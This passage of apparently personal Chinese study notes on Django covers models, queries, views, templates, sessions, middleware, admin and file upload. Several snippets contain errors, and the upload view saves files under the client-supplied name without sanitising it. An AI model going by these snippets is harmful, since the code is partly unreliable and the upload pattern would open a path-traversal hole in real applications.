class=\"headerlink\" title=\"ORM框架\"></a>ORM框架</h3><ul>\n<li>   1、对象和数据库映射</li>\n<li>   2、根据设计的模型生成数据库中的表:    -  1、生长牵引文件:python manage.py makemigrations    - 2、执行牵引文件:python manage.py migrate</li>\n</ul>\n<h3 id=\"模型类\"><a href=\"#模型类\" class=\"headerlink\" title=\"模型类\"></a>模型类</h3><blockquote>\n<p>在models.py中编写模型类</p>\n</blockquote>\n<ul>\n<li> 1、生长迁移文件:python manage.py makemigrations    -    注意如果有ForeignKey的话一定要加上on_delete = models.CASCADE</li>\n<li>2、执行迁移文件:python manage.py migrate</li>\n</ul>\n<blockquote>\n<p>python manage.py shell</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">首先:导入定义好的模型类\n其次:实例化一个对象\n插入 :对象.属性名=值\n保存:对像.save()\n拿到数据:变量 = 类名.objects.get(条件)\n    变量.属性：直接查看\n    变量.属性=值  ——> 变量.save()  :修改\n    变量.delete():删除<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"后台管理（在admin-py中编写后台管理类）\"><a href=\"#后台管理（在admin-py中编写后台管理类）\" class=\"headerlink\" title=\"后台管理（在admin.py中编写后台管理类）\"></a>后台管理（在admin.py中编写后台管理类）</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">本地化: LANGUAGE_CODE &#x3D; &#39;zh-hans&#39; :使用中文\n       TIME_ZONE &#x3D; &#39;Asia&#x2F;Shanghai&#39; :使用中国时间\n\n创建管理员:python manage.py createsuperuser   (第一次新建管理员的时候必须要执行一下牵引文件，可以不生成，但必须执行)\n\n自己创建的管理员是默认是放在数据库中的一个单独的表中的，但是可以使用（在settings.py中）：\n# django认证系统使用的模型类\nAUTH_USER_MODEL&#x3D;&#39;应用.类名&#39;\n\n这个来规定生成数据放在什么表，在实际开发中是特别的重要的，一般和用户信息放在一起\n\n使用这个必须导入(models.py中)from django.contrib.auth.models import AbstractUser\n\n加入自己定义的数据库或者数据库模型: 1、导入 2、admin.site.register(类)\n\n规定自定义的数据库或者数据库模型的显示: list_display(&#39;&#39;,&#39;&#39;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"使用视图（在views中编写）\"><a href=\"#使用视图（在views中编写）\" class=\"headerlink\" title=\"使用视图（在views中编写）\"></a>使用视图（在views中编写）</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">使用模块: from django.http import HttpResponse,HttpResponseRedirect(重定向)\n使用模块: from django.shortcuts import render,redirect(也是重定向)\n使用 return HttpResponse(&#39;返回值&#39;) 返回结果\n使用模块: from django.conf.urls import include, url\nurl的使用方法:url(r&#39;正则表达式&#39;,处理字符串)\n            url(r&#39;正则表达式&#39;,include(处理源))\n\n实现过程: views.py 中创建视图（使用模块第一个） ---&gt;  创建 urls.py (使用第二个模块,并且导入views.py)  ---&gt;  项目中的urls.py\n中添加创建的urls.py(使用url添加)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h3 id=\"模板（项目文件夹中创建-模板文件夹templates）\"><a href=\"#模板（项目文件夹中创建-模板文件夹templates）\" class=\"headerlink\" title=\"模板（项目文件夹中创建 模板文件夹templates）\"></a>模板（项目文件夹中创建 模板文件夹templates）</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">在项目文件夹中的setting中设置TEMPLATES中的DIRS，表示模板位置，一般拼接\n使用模板:\n    导入模块:from django.template import loader\n    1、使用模板文件: temp &#x3D; loader.get_template(&#39;文件名可以带路径&#39;)\n    2、定义上下文（个模板传参数）: context &#x3D; &#123;字典参数&#125;\n    3、渲染模板:产生HTML代码:res_html &#x3D; temp.render(context)\n    4、返回浏览器:return HttpResponse(res_html)\n\n最简单的使用方法: return render(request,&#39;文件可以带路径&#39;,&#123;传参数&#125;)\n\n参数在html代码中的使用方法:\n    普通变量:&#123;&#123;key&#125;&#125;\n    for循环:&#123;% fro x in xx %&#125;\n            &#123;%endfor%&#125;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"关于django和数据库的操作\"><a href=\"#关于django和数据库的操作\" class=\"headerlink\" title=\"关于django和数据库的操作\"></a>关于django和数据库的操作</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、创models文件 class xxx(models.Model)\n2、迁移文件\n3、创建views文件 def xxx(request)，必须有返回值,一般返回值用HttpResponse,使用模板的返回值用render,需要重定向的话使用redirect\n4、新建应用urls.py文件,用于定义访问时用的url地址\n5、取项目中的urls文件中添加应用的url文件 ：url(r&#39;^&#39;,include(xxx.urls))\n6、在项目中创建templates模板文件,在到seting中配置一下，templates中的文件就是html文档<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h3 id=\"第一大点-models-模型-注册模型类\"><a href=\"#第一大点-models-模型-注册模型类\" class=\"headerlink\" title=\"第一大点:models,模型,注册模型类\"></a>第一大点:models,模型,注册模型类</h3><p>django操作数据库的相关知识</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">应用下的models.py文件中定义的所有模型，都要继承一个抽象基类:\n创建抽象基类:在项目中创建一个pythonPakage,名字叫db,在这个包下面创建一个base_model.py文件，在文件中编写一个抽像基类<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> django<span class=\"token punctuation\">.</span>db <span class=\"token keyword\">import</span> models\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">BaseModel</span><span class=\"token punctuation\">(</span>models<span class=\"token punctuation\">.</span>Model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token triple-quoted-string string\">'''模型抽象基类'''</span>\n        create_time <span class=\"token operator\">=</span> models<span class=\"token punctuation\">.</span>DateTimeField<span class=\"token punctuation\">(</span>auto_now_add<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> verbose_name<span class=\"token operator\">=</span><span class=\"token string\">'创建时间'</span><span class=\"token punctuation\">)</span>\n    update_time <span class=\"token operator\">=</span> models<span class=\"token punctuation\">.</span>DateTimeField<span class=\"token punctuation\">(</span>auto_now<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> verbose_name<span class=\"token operator\">=</span><span class=\"token string\">'更新时间'</span><span class=\"token punctuation\">)</span>\n        is_delete <span class=\"token operator\">=</span> models<span class=\"token punctuation\">.</span>BooleanField<span class=\"token punctuation\">(</span>default<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> verbose_name<span class=\"token operator\">=</span><span class=\"token string\">'删除标记'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">Meta</span><span class=\"token punctuation\">:</span>\n        <span class=\"token triple-quoted-string string\">'''说明是一个抽象模型类'''</span>\n        abstract <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"约束选项在字段类型中使用，字段类型在models模块下使用\"><a href=\"#约束选项在字段类型中使用，字段类型在models模块下使用\" class=\"headerlink\" title=\"约束选项在字段类型中使用，字段类型在models模块下使用\"></a>约束选项在字段类型中使用，字段类型在models模块下使用</h5><p>字段类型:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1、AutoField:自动编号\n2、BooleanField:布尔类型\n3、NullBooleanField:Null，True，False三种值\n4、CharField（max_length&#x3D;）:字符串,必须指定max_length\n5、TextField:大文本类型\n6、IntegerField:整数\n7、DecimalField(max_digits&#x3D;,decimal_places&#x3D;):浮点数，第一个参数表示总位数，第二个参数表示小数位数\n8、FloatField(max_digits&#x3D;,decimal_places&#x3D;):浮点数，参数同上\n9、DateField（[auto_now&#x3D;,auto_now_add&#x3D;]）:日期类型，有两个可选参数，用的时候只能用一个，第一个表示更新时间，第二个表示第一次创建的的时间\n10、TimeField（[auto_now&#x3D;,auto_now_add&#x3D;]）:时分秒\n11、DateTimeField（[auto_now&#x3D;,auto_now_add&#x3D;]）:年月日时分秒\n12、FileField:文件上传\n13、ImageField:有效图片\n\n14、ForeignKey:一对多\n15、ManyToManyField:多对多\n16、OneToOneField:一对一\n\n约束选项:\n1、default:默认值\n2、primary_key:主键\n3、unique:不重复\n4、db_index:索引，db_index&#x3D;True&#x2F;False\n5、db_column:指定表字段的名字，db_column&#x3D;&#39;名字&#39;\n6、null:空\n7、blank:是否为空，在后台使用，默认True，在django管理页面有用\n8、chioces：chioces选项,等于一个元组，格式 choices &#x3D; ((xx,xxx),(xx,xxx)……),网页显示为一个列表框\n9、verbose_name：制定在后台的显示名称 ，字段和表名都可以用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"富文本\"><a href=\"#富文本\" class=\"headerlink\" title=\"富文本\"></a>富文本</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">django使用tinymce：\n    pip install django-tinymce\n    from tinymce.models import HTMLField\n    xx &#x3D; HTMLField(verbose_name &#x3D; &#39;xx&#39;)\n    在settings.py中注册这个富文本编辑器，INSTALLED_APPS中添加tinymce\n    在settings.py中设置富文本编辑器的属性：\n        TINYMCE_DEFAULT_CONFIG &#x3D; &#123;\n            &#39;theme&#39;: &#39;advanced&#39;,\n            &#39;width&#39;: 编辑器的宽,\n            &#39;height&#39;: 编辑器的高,\n        &#125;\n    在项目urls中添加: url(r&#39;^tinymce&#x2F;&#39;, include(&#39;tinymce.urls&#39;))\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"查询\"><a href=\"#查询\" class=\"headerlink\" title=\"查询\"></a>查询</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">说明一下:exclude,filter,get三个都时带条件的---&gt;模型名.objects.查询方式(属性名__条件名&#x3D;值)\n条件名:\nexact:判等 ，可以不用直接用 &#x3D;\ncontains:模糊查询，包含\nendswith\\startswith:模糊查询，结尾\\开头\nisnull:空查询,布尔值\nin:范围查询，属性名__in &#x3D; 列表或者元组\ngt,lt,gte,lte:大于，小于，大于等于，小于等于\nday&#x2F;month&#x2F;year:使用方法:日期查询\n\nget():返回满足条件的一条记录\nall():返回所有记录，查询集\nfilter():返回满足条件的所有记录，查询集\nexclude():返回不满足条件的所有记录，查询集\norder_by(‘属性名1’,’属性名2&#39;……):升序\norder_by(‘-属性名1’,’-属性名2&#39;……):降序，order_by()是将查出来的数据进行排序，如：BookInfo.objects.all().order_by(&#39;id&#39;,&#39;-btitle&#39;)\n\n\nQ对象:用于查询时候的多个条件的  ’与或非‘  表示\n    from django.db.models import Q\n    例子:\n        BookInfo.object.filter(Q(id &#x3D; 2) &amp; Q(btitle &#x3D; &#39;hello&#39;))   与\n        BookInfo.object.filter(Q(id &#x3D; 2) | Q(btitle &#x3D; &#39;hello&#39;))   或\n        BookInfo.object.filter(~Q(id &#x3D; 2))                        非\nF对象:条件中用于属性比较,还可以进行算数运算\n    from django.db.models import F\n    例子:\n        BookInfo.objects.filter(id__gt &#x3D; F(&#39;bid&#39;))\n        BookInfo.objects.filter(id__gt &#x3D; F(&#39;bid&#39;)*3)\n\n\n\n聚合函数:sum,count,avg,max,min,在django中通过aggregates来使用\n    from django.db.models import Sum,Count,Avg,Max,Min\n    例子:\n        BookInfo.objects.all().aggregate(Count(&#39;id&#39;)) : 返回值是字典\n        BookInfo.objects.all().aggregate(Sum(&#39;bread&#39;) : 总和\n\n\n插入、更新、删除:\n    save():插入更新\n    delete():删除\n\n关联查询:\n    一对多:对象.多类的名字__set.all()\n    多对一:对象.关系属性\n\n\n模型管理器:\n    也是在models中编写，\n    格式:\n        class xxx (models.Manager):\n            可以定义方法或者定义查询（all）\n\n\n元选项(指定表名):\n    class Meta:\n        db_table &#x3D; &#39;xxx&#39;\n    verbose_name &#x3D; &#39;xxx&#39;\n    verbose_name_plural &#x3D; verbose_name\n    每个需要自定义表名的模型下方都要写这个代码，否则用系统给的表明,后两行代码代表指定在后台显示什么名字<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n<h2 id=\"第二大点-views-视图的使用\"><a href=\"#第二大点-views-视图的使用\" class=\"headerlink\" title=\"第二大点:views,视图的使用\"></a>第二大点:views,视图的使用</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、项目中的urls中加入应用中的urls中的所有，表示项目启动以后可以使用应用的链接配置\n2、应用中的urls用于配置浏览器页面输入的地址，一般只配置‘&#x2F;’以后的\n3、编写views文件，写清楚每个url的动作，定义在函数中,需要返回值\n\n4、views文件中所写的代码就是写应该在网页中现实的东西\n5、如果要使用模板，需要在项目文件夹下创建一个templates文件夹，并且配置好路径\n\n6、return HttpResponse(xx),不用模板\n   return HttpResponseRedirect(地址),redirect(地址)，两个功能一样都是重定向，在数据库添加后及时显示时候用\n   return render(request, &#39;模板文件位置&#39;,&#123;参数&#125;)\n\n重点:关于数据库的操作:导入 models  (类)\n    关于网页内容操作:导入 views   (函数)\n\nseting 中的设置，要改一起改\n    setting 中的DEBUG属性(调试模式):默认是True，改成False后可以显示标准的报错页面\n    setting 中的ALLOWED_HOSTS属性(允许访问):默认注释了的，是一个列表，ALLOWED_HOSTS &#x3D; [&#39;*&#39;]表示所有用户都可访问\n\n给视图传参数: 在urls中配置url的时候，给一个正则的分组就表示给视图传参数:\n            第一种:直接分组:views中的形参可以随便定义 :url(r&#39;^index(\\d+)$&#39;,views.show)--&gt;def show(request,a)\n            第二种:分组命名:views长的形参必须和分组的名字一致  :url(r&#39;^index(?p&lt;num&gt;\\d+)$&#39;,views.show)--&gt;def show(request,num)\nrequest参数:\n    def index (request)中使用,躲在用于登陆的时候使用\n        request.POST:保存的是网页中用post方式提交的参数，参数保存在请求头中\n        request.GET:保存的是网页中用get方式提交的参数，参数保存在url中\n    使用方法:\n        xx &#x3D; request.POST.get(&#39;xxx&#39;)\n        xx &#x3D; request.GET.get(&#39;xxx&#39;)\n\n\n 重点:\n    如果是网页模板，那么需要创建一个templates文件夹在项目文件夹下并且setting中配置路径，上面也提到过\n    如果是静态的文件，js，css，image这些文件的话，需要在项目文件夹下创建一个static文件夹，平且在setting中配置STATIC_URL &#x3D; &#39;&#x2F;static&#x2F;&#39; 和 STATICFILES_DIR &#x3D; [os.path.join(BASE_DIR,&#39;刚刚创建的文件夹static&#39;)]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Cookie（多用于记住用户名）\"><a href=\"#Cookie（多用于记住用户名）\" class=\"headerlink\" title=\"Cookie（多用于记住用户名）\"></a>Cookie（多用于记住用户名）</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">Cookie的设置:需要一个HttpResponse的对象或者他的子类的对象，set_cookie\n取出cookie:request对象的COOKIES中\n\n设置:\n    xxx  &#x3D;  HttpResponse() 实例化HttpResponse的对象\n    xxx.set_cookie(&#39;key&#39;,value,max_age &#x3D; x) max_age是这只cookie的生存周期的，单位为秒\n    xxx.set_cookie(&#39;key2&#39;,value2,max_age &#x3D; x)\n    return xxx\n取出:\n    xxx &#x3D; request.COOKIES[&#39;key&#39;]\n    return HttpResponse(xxx)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"session-多用于银行卡-登录状态\"><a href=\"#session-多用于银行卡-登录状态\" class=\"headerlink\" title=\"session(多用于银行卡,登录状态)\"></a>session(多用于银行卡,登录状态)</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">session是一个特殊的Cookie,他的安全性更高，只给浏览器一个cookie编号,更重要的是，session可以记住用户的登录状态\n\n读取设置都在request\n设置session:\n    request.session[&#39;key&#39;] &#x3D; value\n    request.session[&#39;key2&#39;] &#x3D; value2\n    request.set_expiry(xx) 设置存活时间，整数，秒\n    return HttpResponse(request)\n\n获取:\n    xxx &#x3D; request.session[&#39;xx&#39;]\n    xxx &#x3D; request.session[&#39;xx&#39;]\n    xxx &#x3D; request.session.get(&#39;xx&#39;)\n    return HttpResponse(xx)\n登录状态:\n    判断有没有这个键:request.session.has_key[&#39;&#39;]\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h2 id=\"第三块-模板templates\"><a href=\"#第三块-模板templates\" class=\"headerlink\" title=\"第三块:模板templates\"></a>第三块:模板templates</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">html里面的模板标签:\n    &#96;&#123;&#123;变量&#125;&#125;&#96;\n    &#96;&#123;% xx %&#125;&#96;  &#96; &#123;% endxx %&#125;&#96;\n    &#123;# 注释内容 #&#125;\n   &#96; &#123;% comment %&#125;&#96; 多行注释 &#96;&#123;% endcomment %&#125;&#96;\n\n过滤器:\n    格式: 模板变量 | 过滤器:参数\n    date:改变日期的显示格式\n    length:求字符串和列表的长度\n    default:设置不符合要求时候的默认值\n\n自定义过滤器:\n    在应用下创建一个templatetags包\n    在templatetags中创建过滤器xxx.py\n    在xxx.py中导入 from django.template import Library\n    实例化Library对象，xx &#x3D; Library()\n    定义一个函数，和python一样的，有返回值的\n    装饰一下，@xx.xxx\n\n    在html中加载，在最前面:&#96;&#123;% load xxx %&#125;&#96;\n    使用过滤器:变量 | xx\n    如果xx函数中有参数，竖线前面的变量就是参数，如果有两个以上的参数那么只用传n-1个参数\n\n模板继承:\n    被继承的html模板不动，在子html模板中删除html代码，只写一句&#96;&#123;% extends &#39;父模板地址&#39; %&#125;&#96; 地址相对于templates\n\n    在父模板中预留位置:子模板就可以重写父模板中预留的位置，从而保证有些不同 在父模板中&#96;&#123;% block 块名 %&#125;&#96; 可以写可以不写 &#96;&#123;% endblock 块名 %&#125;&#96;，子模板中也写&#96;&#123;% block 块名 %&#125; &#96;可以写可以不写 &#96;&#123;% endblock 块名 %&#125;&#96;，两边的两个标签需要一样块名一样，内容可以不一样\n    既要使用父模板中的预留内容，也要自定义预留内容:&#96;&#123;% block 块名 %&#125;&#96; &#96;&#123;&#123; block.super &#125;&#125;&#96;可以写可以不写 &#96;&#123;% endblock 块名 %&#125;&#96;\n\n    html转义:\n        在views.py 中render(request,&#39;html 路径&#39;, &#123;&#39;content&#39;:&#39;&lt;h1&gt;hello&lt;&#x2F;h1&gt;&#39;&#125;)\n        这样传过去的用的时候&#123;&#123;content&#125;&#125;，html并不会把传过来的&lt;h1&gt;当作标签，而是转义成了字符\n        解决方法:\n            &#123;&#123; content | safe &#125;&#125;\n\ncsrf伪造攻击:\n    主要原因:\n        1、你在正常登录网站之后，浏览器保存了你的sessionid,而且你并没有退出\n        2、在没有退出的情况下，访问了其他的网站做了一些不好的操作，间接的修改你的密码\n    django默认启用了csrf防护，并且只针对post提交的数据防护，并且对包括自己的所有人防护\n    解决办法:\n        在html文件中有post提交的表单下方第一行输入&#96;&#123;% csrf_token %&#125;&#96;这样自己就可以正常使用了\n\n验证码(防止暴力请求):\n    用闭包的方式验证登录，有些界面只有登陆了才能使用\n    工作的时候网上取down\n\n\nurl 反向解析(给地址取个名字,然后直接用地址就可以动态的生成网页地址，不管网页地址怎么变化):\n    在项目中的urls中的链接应用url地址的地方添加第三个参数:url(r&#39;^&#39;, include(&#39;应用文件夹.urls&#39;), namespace&#x3D;&#39;应用文件夹名字&#39;)  ,namespace&#x3D;&#39;一般用应用名,也可以自定义&#39;\n    然后给应用中urls中的每一个自定义的链接取名:url(r&#39;^xxx$&#39;,views.xx, name &#x3D; &#39;取名&#39;)\n\n    在html中使用:\n        1、&lt;a href &#x3D;&#96; &#123;% url &#39;namespace:name&#39; %&#125;&#96;  url地址中没有参数  url(r&#39;^xx$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        2、&lt;a href &#x3D;&#96; &#123;% url &#39;namespace:name&#39; 1%&#125;&#96;  url地址中有一个参数   url(r&#39;^xx&#x2F;(\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        3、&lt;a href &#x3D; &#96;&#123;% url &#39;namespace:name&#39; 1 3%&#125; &#96; url地址中有两个参数   url(r&#39;^xx&#x2F;(\\d+)&#x2F;(\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        *4、&lt;a href &#x3D; &#96;&#123;% url &#39;namespace:name&#39; a&#x3D;1 b&#x3D;3%&#125;&#96;  url地址中有两个被取名的参数   url(r&#39;^xx&#x2F;(?P&lt;a&gt;\\d+)&#x2F;(?P&lt;b&gt;\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n    在views中使用:\n        from django.core.urlresolvers import reverse\n        1、reverse(&#39;namespace:name&#39;) url地址中没有参数  url(r&#39;^xx$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        2、reverse(&#39;namespace:name&#39;, args &#x3D; (1)) url地址中有一个参数   url(r&#39;^xx&#x2F;(\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        3、reverse(&#39;namespace:name&#39;, args &#x3D; (1,3) url地址中有两个参数   url(r&#39;^xx&#x2F;(\\d+)&#x2F;(\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        *4、reverse(&#39;namespace:name&#39;, kwargs &#x3D; &#123;&#39;a&#39;:1, &#39;b&#39;:2&#125;) url地址中有两个被取名的参数   url(r&#39;^xx&#x2F;(?P&lt;a&gt;\\d+)&#x2F;(?P&lt;b&gt;\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"静态文件-css-js-image\"><a href=\"#静态文件-css-js-image\" class=\"headerlink\" title=\"静态文件(css\\js\\image)\"></a>静态文件(css\\js\\image)</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">在项目文件夹中创建static文件夹\n在setting中配置:\n    STATIC_URL &#x3D; &#39;&#x2F;定义网址以什么开头&#x2F;&#39;  一般都是static\n        这里的名字如果想要随便改，然后在html中动态生成的话，在html中加载 &#96;&#123;% load staticfiles %&#125; &#96; 在要使用的地方用&#96;&#123;% static &#39;文件路径&#39; %&#125;&#96;这样进行拼接\n    STATICFILES_DIR &#x3D; [拼接文件夹位置]\n静态文件的使用实在html中的链接<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"中间件\"><a href=\"#中间件\" class=\"headerlink\" title=\"中间件\"></a>中间件</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、获取浏览器端的ip地址: request.META[&#39;REMOTE_ADDR&#39;],可以设置某些ip访问网站\n2、中间件的左右就是在每一个视图函数调用之前都会先执行中间件，可以判断某些用户或者界面不能使用，如判断是否登录，判断ip是否被禁止\n3、定义中间件的方法:\n    在应用中新建一个middleware.py 的python文件\n    中间件的构成:\n        class xxxx(object):   中间件类\n            xxx\n            def process_view(self, request, view_func, *view_args, **view_kwargs)  中间件函数\n                xxx\n                return xxx\n4、定义了中间件以后，我们需要在setting中注册：找到MIDDLEWARE_CLASSES，然后&#39;应用名.middleware.中间类\n5、中间件函数是内置的，只能使用内置的那么几个:\n    process_view(self, request, view_func, *view_args, **view_kwargs) : url匹配之后，视图调用之前\n    process_request(self, request) : 产生request对象之后， url匹配之前调用\n    __init__(self) : 服务器响应第一个请求的时候调用\n    process_response(self, request, response) : 视图调用之后，内容返回浏览器之前,需要return response\n    process_exception(self, request, exception) : 视图函数出现异常的时候调用，如果有多个exception，则按照注册的从后往前执行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"第四模块Admin后台管理\"><a href=\"#第四模块Admin后台管理\" class=\"headerlink\" title=\"第四模块Admin后台管理\"></a>第四模块Admin后台管理</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、创建用户:python manage.py createsuperuser\n2、登录用户:网址&#x2F;admin\n3、注册模型类:在models.py中定义模型（将数据库中的数据加载到后台管理页面），在admin.py中去注册这个模型，admin.site.register(模型名字)\n\n\n上传图片:\n    在static文件夹中新建一个media文件夹，用于保存用户的头像等\n    在setting中设置MEDIA_ROOT &#x3D; 拼接文件夹,MEDIA_URL &#x3D; &#39;&#x2F;media&#x2F;&#39;\n\n    后台管理界面上传图片:创建一个数据库模型，定义一个字段，类型为ImageField(upload_to &#x3D; &#39;media中的某个文件夹&#39;)\n\n浏览器上传的照片:\n    表单的提交方式和编码方式必须如下\n    &lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; action&#x3D;&quot;&#x2F;upload_down&quot;&gt;\n        &#96;&#123;% csrf_token %&#125;&#96;\n        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;pic&quot;&gt;&lt;br&#x2F;&gt;\n        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot;&gt;\n    &lt;&#x2F;form&gt;\n        读取照片页面信息并保存：\n    def upload(request):\n        return render(request, &#39;upload.html&#39;)\n\n\n    def upload_down(request):\n        pic &#x3D; request.FILES[&#39;pic&#39;]\n        pic_path &#x3D; f&#39;&#123;settings.MEDIA_ROOT&#125;&#x2F;user_admin&#x2F;&#123;pic.name&#125;&#39;\n        with open(pic_path, &#39;wb&#39;) as pf:\n        for content in pic.chunks():\n            pf.write(content)\n        PicInfo.objects.create(pic_super&#x3D;f&#39;user_admin&#123;pic.name&#125;&#39;)\n        return HttpResponse(&#39;ok&#39;)\n浏览器上传的图片：\n    pic &#x3D; request.FILES[&#39;xx&#39;]的对象：pic.name获取文件名,pic.chunks()分块读取内容进行保存，pic.size获取上传文件的大小都是常用的\n\n\n\n分页（ 在view.py中和html代码中使用）:\n    需要包：from django.core.paginator import Paginator\n    Paginator属性:num_pages:返回分页的总页数,page_range:返回分页的页码列表\n    Paginator方法:page(self,number)：返回低number页的Page实例对象\n    Page的属性:number:返回当前页的页码，object_list：返回包含当前页的数据的查询集，paginator:返回对应的Paginator对象\n    page的方法:has_previous:判断是否有前一页,has_next:判断是否有下一页,previous_page_number:放回前一页,next_page_unmber:返回下一页\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"第五模块-url匹配\"><a href=\"#第五模块-url匹配\" class=\"headerlink\" title=\"第五模块(url匹配)\"></a>第五模块(url匹配)</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">可以用path，url\nfrom django.urls import path,include或者from django.conf.urls import url,include\n在project的urls.py中，使用反向解析用到include,在include中添加参数namespace空间命名，可以进行反向解析，在应用中的urls.py中的urlpatterns上面添加一句app_name&#x3D;&#39;xx&#39;这个名字和namespace的名字相同。\n在应用的urls.py中，想使用反向解析，不需要include,可以直接在最后添加参数，name&#x3D;&#39;xx&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n<h2 id=\"数据加密\"><a href=\"#数据加密\" 